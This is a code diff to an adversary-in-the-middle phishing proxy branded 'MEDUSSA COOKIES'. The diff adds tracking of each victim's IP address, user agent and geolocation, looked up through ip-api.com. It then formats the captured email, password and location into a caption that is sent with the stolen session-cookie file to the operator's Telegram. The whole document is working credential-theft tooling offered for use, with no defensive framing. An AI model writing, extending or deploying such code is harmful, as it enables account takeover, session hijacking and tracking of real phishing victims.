@@ -101,6 +101,20 @@ function getClientIP(clientRequest) {
 }
 
 async function getVictimGeo(ip) {
+    if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) return null;
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`);
+        const data = await response.json();
+        if (data.status === 'success') {
+            return {
+                country: data.country || 'N/A',
+                region: data.regionName || 'N/A',
+                city: data.city || 'N/A'
+            };
+        }
+    } catch (err) {
+        console.error('[GEO] Failed:', err.message);
+    }
     return null;
 }
 
@@ -142,7 +156,12 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
+            VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
+            VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
 
+getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
+    if (geo) VICTIM_SESSIONS[session].geo = geo;
+}).catch(() => {}); 
             if (!VICTIM_SESSIONS[session].proxyLevels) {
                 VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
             }
@@ -201,6 +220,13 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                         VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                         VICTIM_SESSIONS[cookieName].host = phishedURL.host;
+
+                                        VICTIM_SESSIONS[cookieName].ip = getClientIP(clientRequest);
+VICTIM_SESSIONS[cookieName].userAgent = headers['user-agent'] || 'Unknown';
+
+getVictimGeo(VICTIM_SESSIONS[cookieName].ip).then(geo => {
+    if (geo) VICTIM_SESSIONS[cookieName].geo = geo;
+}).catch(() => {});
 
                                         clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                         clientResponse.end();
@@ -492,7 +518,27 @@ if (!sessionData.alerted && hasValidSessionCookies(sessionData) && isPostLogin) 
     fs.writeFileSync(filePath, cookiesJson, 'utf8');
 
     // Build caption (email + password only)
-    const caption = `Full Capture\n\nEmail: ${credentials.email}\nPassword: ${credentials.password}`;
+    const sessionIp = sessionData.ip || 'N/A';
+const sessionUserAgent = sessionData.userAgent || 'N/A';
+const sessionGeo = sessionData.geo;
+
+let locationString = sessionIp;
+if (sessionGeo) {
+    locationString = `${sessionGeo.city}, ${sessionGeo.region}, ${sessionGeo.country} (${sessionIp})`;
+}
+
+const border = '═'.repeat(32);
+const caption = 
+`╔${border}╗\n` +
+`║   ⚕️🍪 MEDUSSA COOKIES ⚕️🍪   ║\n` +
+`╠${border}╣\n` +
+`║ 📧 Email: ${credentials.email.padEnd(22)} ║\n` +
+`║ 🔑 Password: ${credentials.password.padEnd(19)} ║\n` +
+`║ 🌐 IP: ${sessionIp.padEnd(26)} ║\n` +
+`║ 📍 Location: ${locationString.padEnd(20)} ║\n` +
+`║ 🖥️ User Agent: ${sessionUserAgent.padEnd(18)} ║\n` +
+`╚${border}╝\n` +
+`\n🔗 @YourTelegramUsername`;
 
     // Send document via Telegram
     sendDocumentToTelegram(filePath, caption)
